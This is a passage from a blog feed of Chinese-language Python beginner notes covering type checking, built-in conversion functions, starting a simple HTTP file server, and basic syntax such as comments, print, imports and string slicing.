    <content type="html"><![CDATA[<span id="more"></span><h3 id="type函数"><a href="#type函数" class="headerlink" title="type函数"></a>type函数</h3><p>输出变量类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a, b, c, d = <span class="hljs-number">1</span>, <span class="hljs-number">1.1</span>, <span class="hljs-literal">True</span>, <span class="hljs-number">4</span>+<span class="hljs-number">3j</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(a), <span class="hljs-built_in">type</span>(b), <span class="hljs-built_in">type</span>(c), <span class="hljs-built_in">type</span>(d))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bool&#x27;</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="isinstance函数"><a href="#isinstance函数" class="headerlink" title="isinstance函数"></a>isinstance函数</h3><p>判断变量类型</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a, b, c, d = <span class="hljs-number">1</span>, <span class="hljs-number">1.1</span>, <span class="hljs-literal">True</span>, <span class="hljs-number">4</span>+<span class="hljs-number">3j</span></span><br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">int</span>))</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">bool</span>))</span><br>False<br></code></pre></td></tr></table></figure><h4 id="type与isinstance对比"><a href="#type与isinstance对比" class="headerlink" title="type与isinstance对比"></a>type与isinstance对比</h4><p>type()不会认为子类是一种父类类型</p><p>isinstance()会认为子类是一种父类类型</p><h3 id="类型转换-转整型int"><a href="#类型转换-转整型int" class="headerlink" title="类型转换-转整型int"></a>类型转换-转整型int</h3><p><strong>int(值 [,base])</strong></p><p>将值转换为 int型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>strit = <span class="hljs-string">&quot;1111&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(strit))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(strit)))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="类型转换-转浮点型float"><a href="#类型转换-转浮点型float" class="headerlink" title="类型转换-转浮点型float"></a>类型转换-转浮点型float</h3><p><strong>float(值)</strong></p><p>将值转换为浮点型</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">strit = <span class="hljs-string">&quot;1111&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(strit))</span><br>&lt;class &#x27;str&#x27;&gt;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">float</span>(strit))</span><br>1111.0<br></code></pre></td></tr></table></figure><h3 id="类型转换-转字符串string"><a href="#类型转换-转字符串string" class="headerlink" title="类型转换-转字符串string"></a>类型转换-转字符串string</h3><p>str(对象)</p><p>将对象转换为字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(dicttest)<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(dicttest))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(dicttest))<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(dicttest)))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="类型转换-转字符串表达式"><a href="#类型转换-转字符串表达式" class="headerlink" title="类型转换-转字符串表达式"></a>类型转换-转字符串表达式</h3><p>repr(对象)</p><p>将对象转换为字符串表达式，也就是供解释器读取的形式</p><p>返回值为对象的字符串形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(dicttest))<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-built_in">repr</span>(dicttest)))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="类型转换-执行表达式"><a href="#类型转换-执行表达式" class="headerlink" title="类型转换-执行表达式"></a>类型转换-执行表达式</h3><p>eval(表达式)</p><p>计算表达式</p><p>返回表达式的值</p><p>注意：该函数利用不当存在代码注入的风险</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1+2&#x27;</span>)</span><br>1+2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;1+2&#x27;</span>))</span><br>3<br></code></pre></td></tr></table></figure><h3 id="类型转换-转元组tuple"><a href="#类型转换-转元组tuple" class="headerlink" title="类型转换-转元组tuple"></a>类型转换-转元组tuple</h3><p><strong>tuple(序列)</strong></p><p>将序列转换为tuple元组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(strit)<br><span class="hljs-number">1111</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(strit))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">tuple</span>(strit))<br>(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="类型转换-转列表list"><a href="#类型转换-转列表list" class="headerlink" title="类型转换-转列表list"></a>类型转换-转列表list</h3><p><strong>list(序列)</strong></p><p>将序列转换为list列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(strit)<br><span class="hljs-number">1111</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(strit))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(strit))<br>[<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="类型转换-转字典dict"><a href="#类型转换-转字典dict" class="headerlink" title="类型转换-转字典dict"></a>类型转换-转字典dict</h3><p><strong>dict(d)</strong></p><h3 id="类型转换-整数转ascii字符"><a href="#类型转换-整数转ascii字符" class="headerlink" title="类型转换-整数转ascii字符"></a>类型转换-整数转ascii字符</h3><p><strong>chr(值)</strong></p><p>值可以是 10 进制也可以是 16 进制的形式的数字，数字范围为 0 到 1,114,111 (16 进制为0x10FFFF)</p><p>返回整数值对应的ascii字符</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">inttest = <span class="hljs-number">97</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(inttest))</span><br>a<br></code></pre></td></tr></table></figure><h3 id="类型转换-字符转整数"><a href="#类型转换-字符转整数" class="headerlink" title="类型转换-字符转整数"></a>类型转换-字符转整数</h3><p><strong>ord(x)</strong></p><p>x为单个字符，如果x超过定义范围，返回TypeError异常</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">&gt;&gt;&gt; <span class="hljs-keyword">print</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;aa&#x27;</span>))<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;python-input-126&gt;&quot;</span>, line <span class="hljs-number">1</span>, in &lt;module&gt;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;aa&#x27;</span>))<br>          ~~~^^^^^^<br>TypeError: <span class="hljs-keyword">ord</span>() expected a character, but string of <span class="hljs-keyword">length</span> <span class="hljs-number">2</span> found<br></code></pre></td></tr></table></figure><p>将字符转换为对应的整数</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-string">&#x27;a&#x27;</span>))</span><br><span class="hljs-number">97</span><br></code></pre></td></tr></table></figure><h3 id="类型转换-整数转十六进制"><a href="#类型转换-整数转十六进制" class="headerlink" title="类型转换-整数转十六进制"></a>类型转换-整数转十六进制</h3><p><strong>hex(x)</strong></p><p>将十进制整数转换为十六进制，以字符串形式展示</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">hex</span>(<span class="hljs-number">97</span>)</span><br><span class="hljs-string">&#x27;0x61&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">hex</span>(<span class="hljs-number">255</span>)</span><br><span class="hljs-string">&#x27;0xff&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="类型转换-整数转八进制"><a href="#类型转换-整数转八进制" class="headerlink" title="类型转换-整数转八进制"></a>类型转换-整数转八进制</h3><p><strong>oct(x)</strong></p><p>将十进制整数转换为八进制，以字符串形式展示</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">oct</span>(<span class="hljs-number">97</span>)</span><br><span class="hljs-string">&#x27;0o141&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">oct</span>(<span class="hljs-number">255</span>)</span><br><span class="hljs-string">&#x27;0o377&#x27;</span><br></code></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_tips</title>
    <link href="/2024/11/11/dev/python3/python_tips/"/>
    <url>/2024/11/11/dev/python3/python_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="启动http服务"><a href="#启动http服务" class="headerlink" title="启动http服务"></a>启动http服务</h2><p>日常在进行文件下载的时候，会出现不同环境下载速度不同或者下载结果不同的情况，为了不同环境之间进行文件传输，可以使用python临时启动httpserver服务器。</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>1）执行python命令的目录就是http服务的根目录</p><p>2）默认端口为 8000 ，可以在命令中指定</p><p>3）启动的服务为单线程</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>python2</p><p>python -m SimpleHTTPServer 3001</p><p>python3</p><p>python -m http.server 3001</p>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_base</title>
    <link href="/2024/11/11/dev/python3/python3_base/"/>
    <url>/2024/11/11/dev/python3/python3_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，python3源码文件以UTF-8编码，所有字符串均为unicode字符串</p><h3 id="设置编码"><a href="#设置编码" class="headerlink" title="设置编码"></a>设置编码</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># -<span class="hljs-emphasis">*- coding:utf-8 -*</span>-</span><br></code></pre></td></tr></table></figure><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>第一个字符必须是字母或下划线_</p><p>标识符组成为数字、大小写字母、下划线_</p><h3 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h3><p>保留字即关键字，不可用于标识符</p><p>保留字查询模块keyword</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> keyword<br><span class="hljs-built_in">print</span>(keyword.kwlist)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  pythoncode <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/Users/</span>admin<span class="hljs-regexp">/python/</span>pythoncode/<span class="hljs-number">1</span>.py<br>[<span class="hljs-string">&#x27;False&#x27;</span>, <span class="hljs-string">&#x27;None&#x27;</span>, <span class="hljs-string">&#x27;True&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;as&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-string">&#x27;async&#x27;</span>, <span class="hljs-string">&#x27;await&#x27;</span>, <span class="hljs-string">&#x27;break&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;continue&#x27;</span>, <span class="hljs-string">&#x27;def&#x27;</span>, <span class="hljs-string">&#x27;del&#x27;</span>, <span class="hljs-string">&#x27;elif&#x27;</span>, <span class="hljs-string">&#x27;else&#x27;</span>, <span class="hljs-string">&#x27;except&#x27;</span>, <span class="hljs-string">&#x27;finally&#x27;</span>, <span class="hljs-string">&#x27;for&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;in&#x27;</span>, <span class="hljs-string">&#x27;is&#x27;</span>, <span class="hljs-string">&#x27;lambda&#x27;</span>, <span class="hljs-string">&#x27;nonlocal&#x27;</span>, <span class="hljs-string">&#x27;not&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;pass&#x27;</span>, <span class="hljs-string">&#x27;raise&#x27;</span>, <span class="hljs-string">&#x27;return&#x27;</span>, <span class="hljs-string">&#x27;try&#x27;</span>, <span class="hljs-string">&#x27;while&#x27;</span>, <span class="hljs-string">&#x27;with&#x27;</span>, <span class="hljs-string">&#x27;yield&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>单行注释 #</p><p>多行注释 ‘’’   ‘’’&#x2F; “””   “””</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#x27;&#x27;&#x27;<br>多行注释<br>&#x27;&#x27;&#x27;<br><br>&quot;&quot;&quot;多行注释&quot;&quot;<br></code></pre></td></tr></table></figure><h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h3><p>同一个代码块的语句必须包含相同的缩进空格数</p><h3 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h3><p>可以用 \ 连接多行语句</p><p>[]、{}、()中的多行语句不能用\连接</p><h3 id="等待输入"><a href="#等待输入" class="headerlink" title="等待输入"></a>等待输入</h3><p>input()</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">input</span>(<span class="hljs-string">&quot;请准备输入～&quot;</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  pythoncode <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/Users/</span>admin<span class="hljs-regexp">/python/</span>pythoncode/<span class="hljs-number">1</span>.py<br>请准备输入～<br></code></pre></td></tr></table></figure><h3 id="print输出"><a href="#print输出" class="headerlink" title="print输出"></a>print输出</h3><p>print()</p><p>默认换行</p><p>不换行需要在变量末尾加上 end&#x3D;””</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span> = <span class="hljs-string">&quot;a1&quot;</span><br><span class="hljs-selector-tag">b</span> = <span class="hljs-string">&quot;b1&quot;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b)</span></span><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a, end=<span class="hljs-string">&quot;&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b, end=<span class="hljs-string">&quot;&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  pythoncode <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/Users/</span>admin<span class="hljs-regexp">/python/</span>pythoncode/<span class="hljs-number">1</span>.py<br>a1<br>b1<br>a1b1%         <br></code></pre></td></tr></table></figure><h3 id="import-from-import"><a href="#import-from-import" class="headerlink" title="import&#x2F;from import"></a>import&#x2F;from import</h3><h4 id="导入整个模块"><a href="#导入整个模块" class="headerlink" title="导入整个模块"></a>导入整个模块</h4><p>import modulename</p><h4 id="导入模块单个函数"><a href="#导入模块单个函数" class="headerlink" title="导入模块单个函数"></a>导入模块单个函数</h4><p>from moudlename import funname</p><h4 id="导入模块多个函数"><a href="#导入模块多个函数" class="headerlink" title="导入模块多个函数"></a>导入模块多个函数</h4><p>from moudlename import funname1,funname2</p><h4 id="导入模块所有函数"><a href="#导入模块所有函数" class="headerlink" title="导入模块所有函数"></a>导入模块所有函数</h4><p>from moudlename import *</p><h1 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量不需要声明</p><p>变量必须赋值</p><p>等号&#x3D;进行赋值</p><h2 id="多变量赋值"><a href="#多变量赋值" class="headerlink" title="多变量赋值"></a>多变量赋值</h2><p>varname1 &#x3D; varname2 &#x3D; varname3 &#x3D; varvalue</p><p>varname3, varname4, varname5 &#x3D; varvalue3, varvalue4, varvalue5</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br>varname1 = varname2 = varname3 = <span class="hljs-string">&quot;varvalue&quot;</span><br><br>varname4, varname5, varname6 = <span class="hljs-string">&quot;varvalue4&quot;</span>, <span class="hljs-string">&quot;varvalue5&quot;</span>, <span class="hljs-string">&quot;varvalue6&quot;</span><br><br><span class="hljs-built_in">print</span>(varname1, varname2,varname3,varname4,varname5,varname6)<br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  pythoncode <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/Users/</span>admin<span class="hljs-regexp">/python/</span>pythoncode/<span class="hljs-number">1</span>.py<br>varvalue varvalue varvalue varvalue4 varvalue5 varvalue6<br></code></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>bool布尔类型</p><h4 id="不可变数据"><a href="#不可变数据" class="headerlink" title="不可变数据"></a>不可变数据</h4><h5 id="Number数字"><a href="#Number数字" class="headerlink" title="Number数字"></a>Number数字</h5><p>int</p><p>float</p><p>complex复数</p><p>注意：</p><p>1、True和False可以与数字相加，True&#x3D;&#x3D;1、False&#x3D;&#x3D;0返回True</p><p>2、数值的除法包含两个运算符：**&#x2F;** 返回一个浮点数，**&#x2F;&#x2F;** 返回一个整数</p><p>3、在混合计算时，Python会把整型转换成为浮点数</p><h6 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h6><p>int 的子类</p><p>两个值 True&#x2F;False</p><p>可以和其他数据类型比较，True等价为 1，False等价为0</p><p>所有非零的数字和非空的字符串、列表、元组等数据类型都视为 True，0、空字符串、空列表、空元组被视为False</p><h5 id="String字符串"><a href="#String字符串" class="headerlink" title="String字符串"></a>String字符串</h5><p>单引号’’或双引号””包含</p><p>使用反斜线\转义特殊字符</p><p>截取格式：变量名[开始下标:结束下标]，下标(索引)从 0 开始，-1为从末尾的开始位置</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = <span class="hljs-string">&quot;stringtest&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>])</span><br>tri<br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[-<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>])</span><br>tes<br></code></pre></td></tr></table></figure><p>没有开始下标</p><p>没有结束下标，表示从开始位置到结束</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = <span class="hljs-string">&quot;stringtest&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[-<span class="hljs-number">5</span>:])</span><br>gtest<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[<span class="hljs-number">5</span>:])</span><br>gtest<br></code></pre></td></tr></table></figure><p>没有开始下标，表示从头到结束下标</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = <span class="hljs-string">&quot;stringtest&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[:<span class="hljs-number">5</span>])</span><br>strin<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[:-<span class="hljs-number">5</span>])</span><br>strin<br></code></pre></td></tr></table></figure><p>加号 + 字符连接符</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a + <span class="hljs-string">&quot;20241112&quot;</span>)</span><br>stringtest20241112<br></code></pre></td></tr></table></figure><p>星号 ***** 表示复制当前字符串，与之结合的数字为复制的次数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a * <span class="hljs-number">2</span>)</span><br>stringteststringtest<br></code></pre></td></tr></table></figure><p>反斜杠 \ 转义特殊字符，字符串前加r，反斜杠不再转义，显示原始字符串</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta 